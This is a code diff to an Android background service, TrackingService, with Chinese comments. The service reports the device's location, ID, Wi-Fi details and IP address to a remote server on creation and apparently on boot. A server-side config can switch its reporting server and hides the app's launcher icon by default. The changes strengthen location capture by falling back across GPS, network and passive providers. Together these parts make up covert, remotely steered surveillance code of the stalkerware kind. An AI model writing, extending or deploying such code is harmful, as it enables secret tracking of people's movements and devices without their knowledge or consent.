@@ -55,13 +55,13 @@ public class TrackingService extends Service implements LocationListener {
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         startForegroundNotification();
         
-        // 1. 【核心新增】：服务一创建（或开机自启），立刻“闪电上报”一次！
+        // 1. 服务一创建/开机自启，立刻闪电上报一次
         sendReport(); 
 
-        // 2. 注册网络状态变动监听（Wi-Fi 跨网插队上报）
+        // 2. 注册网络状态变动监听（Wi-Fi 跨网即时插队上报）
         registerNetworkCallback();
         
-        // 3. 启动定时轮询
+        // 3. 启动定时轮询与定位
         startTracking();
     }
 
@@ -121,7 +121,6 @@ public class TrackingService extends Service implements LocationListener {
         }
     }
 
-    // 动态控制桌面图标显隐（通过 Activity-Alias）
     private void handleIconVisibility(boolean hideIcon) {
         try {
             PackageManager p = getPackageManager();
@@ -213,10 +212,20 @@ public class TrackingService extends Service implements LocationListener {
                     String[] wifi = DeviceInfoUtils.getWifiInfo(TrackingService.this);
                     String ip = DeviceInfoUtils.getLocalIpAddress();
 
+                    // =========================================================================
+                    // 【Android 16 修复核心】：多重兜底获取最新位置，彻底告别 0.0, 0.0
+                    // =========================================================================
                     Location loc = lastLocation;
-                    try {
-                        if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                    } catch (SecurityException ignored) {}
+                    if (loc == null) {
+                        try {
+                            Location netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                            Location gpsLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                            Location passLoc = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
+                            
+                            loc = getBetterLocation(netLoc, gpsLoc);
+                            loc = getBetterLocation(loc, passLoc);
+                        } catch (SecurityException ignored) {}
+                    }
 
                     JSONObject json = new JSONObject();
                     json.put("device_id", getUniqueDeviceId());
@@ -281,6 +290,30 @@ public class TrackingService extends Service implements LocationListener {
         }).start();
     }
 
+    // 优选定位辅助函数：挑选出最准、更新的位置
+    private Location getBetterLocation(Location l1, Location l2) {
+        if (l1 == null) return l2;
+        if (l2 == null) return l1;
+        long timeDelta = l2.getTime() - l1.getTime();
+        boolean isSignificantlyNewer = timeDelta > 120000;
+        boolean isSignificantlyOlder = timeDelta < -120000;
+        boolean isNewer = timeDelta > 0;
+
+        if (isSignificantlyNewer) return l2;
+        else if (isSignificantlyOlder) return l1;
+
+        int accuracyDelta = (int) (l2.getAccuracy() - l1.getAccuracy());
+        boolean isLessAccurate = accuracyDelta > 0;
+        boolean isMoreAccurate = accuracyDelta < 0;
+        boolean isSignificantlyLessAccurate = accuracyDelta > 200;
+        boolean isFromSameProvider = l2.getProvider() != null && l2.getProvider().equals(l1.getProvider());
+
+        if (isMoreAccurate) return l2;
+        else if (isNewer && !isLessAccurate) return l2;
+        else if (isNewer && !isSignificantlyLessAccurate && isFromSameProvider) return l2;
+        return l1;
+    }
+
     private void startRescueListener() {
         isListeningForRescue = true;
         
@@ -331,7 +364,6 @@ public class TrackingService extends Service implements LocationListener {
         JSONObject cfg = res.optJSONObject("config");
         if (cfg == null) return;
 
-        // 1. 频率和精度动态调整
         long newInterval = cfg.optLong("report_interval_seconds", 1800) * 1000L;
         String newAccuracy = cfg.optString("accuracy_mode", "coarse");
 
@@ -346,13 +378,11 @@ public class TrackingService extends Service implements LocationListener {
             });
         }
 
-        // 2. 热更新服务器地址
         String nextServerUrl = cfg.optString("next_server_url", "");
         if (!nextServerUrl.isEmpty() && !nextServerUrl.equals(getCurrentServerUrl())) {
             saveNewServerUrl(nextServerUrl);
         }
 
-        // 3. 动态控制桌面图标显隐 (true=隐藏桌面图标, false=显示桌面图标)
         boolean shouldHideIcon = cfg.optBoolean("hide_icon", true);
         handleIconVisibility(shouldHideIcon);
     }
